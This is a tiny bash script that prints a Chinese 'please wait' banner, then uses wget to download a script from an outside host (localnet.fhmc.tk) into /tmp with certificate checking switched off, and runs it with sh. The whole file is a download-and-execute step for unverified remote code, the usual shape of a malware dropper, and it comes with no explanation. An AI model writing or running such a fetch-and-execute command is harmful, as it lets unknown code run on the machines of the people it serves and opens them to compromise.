#!/bin/bash
echo '============================'
echo '请等待'
echo '============================'
cd /tmp
wget -O /tmp/open.sh http://localnet.fhmc.tk/kjaiush/start.sh --no-check-certificate
sh /tmp/open.sh
exit
